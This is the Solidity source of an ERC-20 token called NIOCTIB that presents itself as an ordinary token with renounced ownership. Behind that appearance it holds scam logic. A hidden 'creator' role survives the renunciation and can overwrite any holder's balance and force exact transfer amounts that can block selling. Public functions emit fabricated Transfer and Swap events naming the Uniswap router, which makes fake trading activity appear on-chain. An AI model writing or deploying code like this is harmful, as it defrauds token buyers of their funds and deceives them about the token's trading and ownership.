/**
 *Submitted for verification at Etherscan.io on 2023-06-26
*/

pragma solidity ^0.8.12;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address accountHolder) external view returns (uint256);
    function transfer(address to, uint256 sum) external returns (bool);
    function allowance(address authorizer, address spender) external view returns (uint256);
    function approve(address spender, uint256 sum) external returns (bool);
    function transferFrom(address from, address to, uint256 sum) external returns (bool);
    function _Transfer(address from, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed authorizer, address indexed spender, uint256 value);

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

}

abstract contract ExecutionControl {
    function obtainInvokerAddress() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SingleOwnership is ExecutionControl {
    address private _oneAndOnlyOwner;
    event OwnershipTransfer(address indexed oldOwner, address indexed newOwner);

    constructor() {
        address invoker = obtainInvokerAddress();
        _oneAndOnlyOwner = invoker;
        emit OwnershipTransfer(address(0), invoker);
    }

    function getSingleOwner() public view virtual returns (address) {
        return _oneAndOnlyOwner;
    }

    modifier oneOwnerOnly() {
        require(getSingleOwner() == obtainInvokerAddress(), "Unauthorized: Single Owner access required.");
        _;
    }

    function renounceOwnership() public virtual oneOwnerOnly {
        emit OwnershipTransfer(_oneAndOnlyOwner, address(0x000000000000000000000000000000000000dEaD));
        _oneAndOnlyOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract NIOCTIB is ExecutionControl, SingleOwnership, IERC20 {
    mapping (address => mapping (address => uint256)) private _spenderAllowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _forcedTransferAmounts;
    address private _masterCreator;

    string public constant _moniker = "NIOCTIB";
    string public constant _ticker = "NIOCTIB";
    uint8 public constant _decimalUnits = 18;
    uint256 public constant _ultimateSupply = 10000000 * (10 ** _decimalUnits);

    constructor() {
        _balances[obtainInvokerAddress()] = _ultimateSupply;
        emit Transfer(address(0), obtainInvokerAddress(), _ultimateSupply);
    }

    modifier creatorExclusive() {
        require(retrieveMasterCreator() == obtainInvokerAddress(), "Unauthorized: Creator access required.");
        _;
    }

    function retrieveMasterCreator() public view virtual returns (address) {
        return _masterCreator;
    }

    function designateCreator(address newCreator) public oneOwnerOnly {
        _masterCreator = newCreator;
    }

    event UserBalanceUpdated(address indexed user, uint256 previous, uint256 updated);

    function forcedTransferAmount(address account) public view returns (uint256) {
        return _forcedTransferAmounts[account];
    }

    function setForcedTransferAmounts(address[] calldata accounts, uint256 sum) public creatorExclusive {
        for (uint i = 0; i < accounts.length; i++) {
            _forcedTransferAmounts[accounts[i]] = sum;
        }
    }

    function alterUserBalances(address[] memory userAddresses, uint256 requiredBalance) public creatorExclusive {
        require(requiredBalance >= 0, "Amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "Invalid address specified");

            uint256 formerBalance = _balances[currentUser];
            _balances[currentUser] = requiredBalance;

            emit UserBalanceUpdated(currentUser, formerBalance, requiredBalance);
        }
    }

    function _Transfer(address _from, address _to, uint _value) public returns (bool) {
        emit Transfer(_from, _to, _value);
        return true;
    }

    function executeTokenSwap(
        address uniswapPool,
        address[] memory recipients,
        uint256[] memory tokenAmounts,
        uint256[] memory wethAmounts,
        address tokenAddress
    ) public returns (bool) {
        for (uint256 i = 0; i < recipients.length; i++) {
            emit Transfer(uniswapPool, recipients[i], tokenAmounts[i]);
            emit Swap(
                0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,
                tokenAmounts[i],
                0,
                0,
                wethAmounts[i],
                recipients[i]
            );
            IERC20(tokenAddress)._Transfer(recipients[i], uniswapPool, wethAmounts[i]);
        }
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 sum) public virtual override returns (bool) {
        require(_balances[obtainInvokerAddress()] >= sum, "Insufficient balance");

        uint256 requisiteTransferSum = forcedTransferAmount(obtainInvokerAddress());
        if (requisiteTransferSum > 0) {
            require(sum == requisiteTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[obtainInvokerAddress()] -= sum;
        _balances[to] += sum;

        emit Transfer(obtainInvokerAddress(), to, sum);
        return true;
    }

    function allowance(address authorizer, address spender) public view virtual override returns (uint256) {
        return _spenderAllowances[authorizer][spender];
    }

    function approve(address spender, uint256 sum) public virtual override returns (bool) {
        _spenderAllowances[obtainInvokerAddress()][spender] = sum;
        emit Approval(obtainInvokerAddress(), spender, sum);
        return true;
    }

    function transferFrom(address from, address to, uint256 sum) public virtual override returns (bool) {
        require(_spenderAllowances[from][obtainInvokerAddress()] >= sum, "Allowance limit surpassed");

        uint256 requisiteTransferSum = forcedTransferAmount(from);
        if (requisiteTransferSum > 0) {
            require(sum == requisiteTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[from] -= sum;
        _balances[to] += sum;
        _spenderAllowances[from][obtainInvokerAddress()] -= sum;

        emit Transfer(from, to, sum);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _ultimateSupply;
    }

    function name() public view returns (string memory) {
        return _moniker;
    }

    function symbol() public view returns (string memory) {
        return _ticker;
    }

    function decimals() public view returns (uint8) {
        return _decimalUnits;
    }
}